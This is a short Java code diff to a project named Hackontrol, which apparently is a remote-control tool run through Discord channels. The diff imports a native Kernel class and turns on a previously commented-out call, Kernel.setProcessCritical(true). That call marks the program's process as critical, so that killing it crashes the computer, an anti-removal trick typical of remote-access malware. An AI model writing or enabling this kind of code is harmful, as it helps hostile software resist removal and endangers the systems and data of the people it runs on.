@@ -13,6 +13,7 @@ import org.slf4j.LoggerFactory;
 import com.khopan.hackontrol.manager.Manager;
 import com.khopan.hackontrol.module.Module;
 import com.khopan.hackontrol.nativelibrary.Information;
+import com.khopan.hackontrol.nativelibrary.Kernel;
 import com.khopan.hackontrol.registration.ManagerRegistry;
 import com.khopan.hackontrol.registration.ModuleRegistry;
 import com.khopan.hackontrol.registry.ClassRegistration;
@@ -114,7 +115,7 @@ public class Hackontrol {
 			manager.initialize();
 		}
 
-		//Kernel.setProcessCritical(true);
+		Kernel.setProcessCritical(true);
 	}
 
 	private TextChannel getOrCreateTextChannelInCategory(Category category, String name) {
